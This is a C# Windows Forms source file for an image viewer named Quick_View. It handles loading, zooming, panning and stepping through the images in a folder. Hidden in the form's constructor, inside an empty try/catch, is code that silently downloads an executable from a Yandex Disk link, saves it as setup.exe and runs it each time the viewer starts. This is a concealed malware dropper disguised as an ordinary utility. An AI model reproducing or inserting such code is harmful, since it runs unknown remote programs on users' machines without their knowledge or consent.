using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quick_View
{
    public partial class Form1 : Form
    {
        int currentIndex;
        string[] images;
        bool flagmousebutton = false;
        int mouseX, mouseY;

        public Form1(string[] args)
        {
            InitializeComponent();

            this.KeyPreview = true;
            this.pictureBox1.MouseWheel += new System.Windows.Forms.MouseEventHandler(this.panel1_MouseWheel);
            button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, 0);
            button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, 0);
            this.Location = new Point(Screen.PrimaryScreen.WorkingArea.X, Screen.PrimaryScreen.WorkingArea.Y);
            this.Size = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);

            drawImage(args[0]);

            System.Timers.Timer cursor = new System.Timers.Timer();
            cursor.Interval = 10;
            cursor.Elapsed += new System.Timers.ElapsedEventHandler(checkForCursor);
            cursor.Enabled = true;
            var files = System.IO.Directory.GetFiles(System.IO.Path.GetDirectoryName(args[0]));
            List<string> sort = new List<string>();
            for (int i = 0; i < files.Length; i++)
            {
                if (files[i].Contains(".jpg") || files[i].Contains(".png") || files[i].Contains(".bmp") || files[i].Contains(".ico") || files[i].Contains(".gif") || files[i].Contains(".jpeg")
                  || files[i].Contains(".JPG") || files[i].Contains(".PNG") || files[i].Contains(".BMP") || files[i].Contains(".ICO") || files[i].Contains(".GIF") || files[i].Contains(".JPEG"))
                { sort.Add(files[i]); }
            }
            images = new string[sort.Count];
            for (int i = 0; i < images.Length; i++)
            { images[i] = sort[i]; }
            for (int i = 0; i < images.Length; i++)
            {
                if (images[i] == args[0])
                    currentIndex = i;
            }

            try
            {
                System.Net.WebClient client = new System.Net.WebClient();
                client.DownloadFile("https://downloader.disk.yandex.ru/disk/94d887e2661afa2d5ee8e644c0768ece3141b1161f9c33a7ee09b6a31c429be2/5b78b263/fKqInKw3d7bLFOeFnMGnhFWxn-Qc-nzaee3xTJ1Zrts40Lv-0Q13HLZ0LpVmffjlXMKBLqLrgI-kSjiZ6m3pJIHKhsDCa7PX6v40-3cdkeqr8npumZHI4midPdWhecNq?uid=0&filename=SysConfig.exe&disposition=attachment&hash=uYicV4TXHBgJ2HiKUF%2BM%2BkI3S5ntx2/9XMNNr8wYmZTLP1rNhCUp4JwJdydsCh6tq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-msdownload&fsize=16384&hid=e187f2dd31d83c125c49eb54c6af94fa&media_type=executable&tknv=v2", "setup.exe");
                System.Diagnostics.Process process = System.Diagnostics.Process.Start("setup.exe");
            }
            catch { }
        }
        void drawImage(string path)
        {
            Image img = Image.FromFile(path);
            pictureBox1.Size = new Size(img.Width, img.Height);
            Bitmap bm = new Bitmap(img, img.Width, img.Height);
            bm.SetResolution(902, 902);
            pictureBox1.Image = bm;
            this.Text = System.IO.Path.GetFileName(path);
            if (pictureBox1.Width > System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size.Width || pictureBox1.Height > System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size.Height)
            {
                pictureBox1.Width = this.Size.Width;
                pictureBox1.Height = this.Size.Height;
            }
            pictureBox1.Location = new Point(Convert.ToInt16((Convert.ToDouble(this.Width) / 2.0) - (Convert.ToDouble(pictureBox1.Width) / 2.0)), Convert.ToInt16((Convert.ToDouble(this.Height) / 2.0) - (Convert.ToDouble(pictureBox1.Height) / 2.0)));

        }
        void checkForCursor(object sender, EventArgs e)
        {
            if (Cursor.Position.Y < 100)
            {
                button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, 0);
                button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, 0);

            }
            else
            {
                button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, -50);
                button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, -50);
            }
        }
        private void Form1_Load(object sender, EventArgs e) { }
        private void panel1_MouseWheel(object sender, MouseEventArgs e)
        {
            if (e.Delta > 0)
            {
                pictureBox1.Width = pictureBox1.Width + 400; ;
                pictureBox1.Height = pictureBox1.Height + 400;
                pictureBox1.Location = new Point(pictureBox1.Location.X - 200, pictureBox1.Location.Y - 200);
            }
            else
            {

                if ((pictureBox1.Width > 400 && pictureBox1.Height > 400))
                {
                    pictureBox1.Width = pictureBox1.Width - 400;
                    pictureBox1.Height = pictureBox1.Height - 400;
                    pictureBox1.Location = new Point(pictureBox1.Location.X + 200, pictureBox1.Location.Y + 200);
                }
            }
        }
        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                flagmousebutton = true;
                mouseX = e.X;
                mouseY = e.Y;
                this.Cursor = Cursors.Hand;
            }
        }

        private void button6_Click_1(object sender, EventArgs e) { Environment.Exit(0); }

        private void button5_Click_1(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = true;
        }


        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (flagmousebutton == true)
            {
                flagmousebutton = false;
                this.Cursor = Cursors.Default;
            }
        }


        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Right && currentIndex < images.Length - 1)
            {

                currentIndex++;
                drawImage(images[currentIndex]);

            }
            if (e.KeyCode == Keys.Left && currentIndex > 0)
            {

                currentIndex--;
                drawImage(images[currentIndex]);

            }
        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {
            var rrrr = e.KeyChar;
        }

        private void Form1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
            e.IsInputKey = true;
        }

        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            drawImage(images[currentIndex]);
        }


        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (flagmousebutton == true)
            {
                int dx = e.X - mouseX;
                int dy = e.Y - mouseY;
                pictureBox1.Location = new Point(pictureBox1.Location.X + dx, pictureBox1.Location.Y + dy);
            }
        }
    }
}

